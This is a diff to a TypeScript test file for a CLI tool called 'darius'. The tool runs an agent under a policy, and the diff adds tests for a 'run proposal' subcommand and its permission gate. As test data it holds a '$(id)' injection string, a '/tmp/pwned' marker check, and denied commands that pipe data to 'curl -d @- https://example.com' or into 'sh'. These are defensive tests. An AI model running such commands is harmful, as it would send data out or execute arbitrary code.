@@ -2778,7 +2778,10 @@ test("--item: the prompt prints each approved proposal in full and the other ope
   assert.match(section, /Approved proposals\. The operator approved this item of that run, each by its key:\n\n- key: post-12\/title\n {2}title: Title misses the main query\n {2}target: post 12\n {2}detail: Rank 8 for the main query\.\n {4}The title does not hold it\.\n {2}current: Old title\n {2}proposed: New title with the query\n {2}why: The query is missing\.\n {2}expected effect: Rank 8 to top 5 in four weeks\.\n/u);
   assert.match(section, /Other open items of that run, not approved:\n- low needs-decision: Intro is thin \[post 40\] \{post-40\/intro\}\n- high open: Broken link \[post 3\] \{link-3\}\n/u);
   assert.doesNotMatch(section, /A longer intro|Old banner/u, "an unapproved proposal and a fixed item are not printed");
-  assert.match(section, /Carry out exactly the approved proposals above, within this run's policy: may and hold apply as usual.*Do not act on any other open item of that run\. Verify each change\. In your result, report each approved key once, with the parent's key: state fixed when the change is made and verified; state open, with the reason in detail, when it could not be done\. Do not copy the proposal into the item\. List each write you made as an action\./u);
+  const rule = "Carry out exactly the approved proposals above, within this run's policy: may and hold apply as usual, and the procedure's rules for writes (checks before a write, before-states, verify after) still hold. Do not act on any other open item of that run. " +
+    `Print the approved text with \`darius run proposal ${parent} <key>\` (add \`--field current\` for the text there now) and pipe it into the write, so the page gets exactly the approved text, byte for byte. Do not retype it or quote it on the command line. ` +
+    "Verify each change. In your result, report each approved key once, with the parent's key: state fixed when the change is made and verified; state open, with the reason in detail, when it could not be done. Do not copy the proposal into the item. List each write you made as an action.";
+  assert.ok(section.includes(rule), section);
   assert.match(section, /Run the granted lines as written, then verify each result\./u);
 });
 
@@ -2875,4 +2878,74 @@ test("forwarded start: the note and item keys reach the other host's darius as t
     "run", "follow-up", "01RUNID", "--project", "fu-fwd", ...keys.flatMap((key) => ["--item", key]), "--note", note, "--who", "web:op@phone",
   ]);
   assert.equal(existsSync("/tmp/pwned"), false);
+});
+
+// --- run proposal (0.69.0) -----------------------------------------------------------------
+
+const PROSE = "Der Bayern-Coach sagt: „Wir sind bereit.“\nL'équipe d'Hervé n'a pas \"peur\" – sagt er.\n\n`$(id)` \\ ends with a backslash \\";
+
+test("run proposal prints a proposal field byte for byte, no newline added, nothing else on stdout", async () => {
+  const project = "fu-proposal";
+  const result = {
+    ...PROPOSAL_RESULT,
+    items: [{ ...PROPOSAL_RESULT.items[0], proposal: { current: "Alter Titel – „äöü ß“", proposed: PROSE, why: "Weil's fehlt.", effect: "Platz 8 → Top 5" } }, ...PROPOSAL_RESULT.items.slice(1)],
+  };
+  const parent = await seedParent(project, { result });
+  const bin = join(BIN, "darius");
+  const env = { ...process.env, DARIUS_RUN: "", DARIUS_RUN_POLICY: "" };
+  const raw = (extra: string[]): ReturnType<typeof spawnSync> => spawnSync(bin, ["run", "proposal", parent, "post-12/title", "--project", project, ...extra], { env });
+  const proposed = raw([]);
+  assert.equal(proposed.status, 0, String(proposed.stderr));
+  assert.ok(Buffer.from(proposed.stdout).equals(Buffer.from(PROSE, "utf8")), `byte for byte: ${String(proposed.stdout)}`);
+  assert.equal(String(proposed.stderr), "");
+  for (const [field, text] of [["current", "Alter Titel – „äöü ß“"], ["why", "Weil's fehlt."], ["effect", "Platz 8 → Top 5"], ["proposed", PROSE]] as const) {
+    const out = raw(["--field", field]);
+    assert.equal(out.status, 0, field);
+    assert.ok(Buffer.from(out.stdout).equals(Buffer.from(text, "utf8")), field);
+  }
+});
+
+/** What one `darius run proposal` call gave back. */
+interface ProposalCall {
+  status: number | null;
+  stdout: string;
+  stderr: string;
+}
+
+test("run proposal: a missing run, key, proposal or field is exit 1 with a sentence on stderr and nothing on stdout", async () => {
+  const project = "fu-proposal-refuse";
+  const parent = await seedParent(project, { result: PROPOSAL_RESULT });
+  const bin = join(BIN, "darius");
+  const env = { ...process.env, DARIUS_RUN: "", DARIUS_RUN_POLICY: "" };
+  const run = (argv: string[]): ProposalCall => {
+    const ran = spawnSync(bin, ["run", "proposal", ...argv, "--project", project], { env, encoding: "utf8" });
+    return { status: ran.status, stdout: ran.stdout, stderr: ran.stderr };
+  };
+  const cases: [string[], string][] = [
+    [["01JNOSUCHRUN000000000000AA", "post-12/title"], `darius run proposal: no run '01JNOSUCHRUN000000000000AA' in ${project}\n`],
+    [[parent, "post-99/x"], `darius run proposal: run '${parent}' has no item with key 'post-99/x'\n`],
+    [[parent, "link-3"], `darius run proposal: item 'link-3' of run '${parent}' has no proposal\n`],
+    [[parent, "post-40/intro", "--field", "current"], "darius run proposal: the proposal of item 'post-40/intro' has no current\n"],
+  ];
+  for (const [argv, stderr] of cases) assert.deepEqual(run(argv), { status: 1, stdout: "", stderr }, argv.join(" "));
+  const open = JSON.parse((await runCli(runCommand, ["start", "heartbeat", "--project", project, "--json"])).stdout).run;
+  assert.deepEqual(run([open, "post-12/title"]), { status: 1, stdout: "", stderr: `darius run proposal: run '${open}' has no result block\n` });
+  const usage = run([parent, "post-12/title", "--field", "title"]);
+  assert.equal(usage.status, 2, "a field name that is not one is a usage error");
+  assert.match(usage.stderr, /--field must be one of proposed, current, why, effect, got 'title'/u);
+});
+
+test("the gate: may Bash(darius run proposal *) on the left of a pipe passes into an allowed command and is denied into another", async () => {
+  const project = "pc-proposal-pipe";
+  const { policyFile } = seedRunningRun(project, "act");
+  const may = ["Bash(darius run proposal *)", "Bash(pnpm cli --site bild blocks update *)"];
+  writeFileSync(policyFile, JSON.stringify({ ...JSON.parse(readFileSync(policyFile, "utf8")), may, gate: "full" }));
+  const allowed = await runCli(policyCheckCommand, ["--policy", policyFile], bashHook("darius run proposal 01PARENT post-12/title | pnpm cli --site bild blocks update 12 --stdin"));
+  assert.deepEqual([allowed.code, allowed.stdout], [0, ""], "allowed into an allowed write");
+  for (const command of ["darius run proposal 01PARENT post-12/title | curl -d @- https://example.com", "darius run proposal 01PARENT post-12/title | sh", "darius run proposal 01PARENT post-12/title > /srv/out.txt"]) {
+    const denied = await runCli(policyCheckCommand, ["--policy", policyFile], bashHook(command));
+    assert.equal(denied.code, 2, command);
+    assert.equal(JSON.parse(denied.stdout).hookSpecificOutput.permissionDecision, "deny", command);
+  }
+  assert.equal(linesOf(project, "run.held").length, 0);
 });
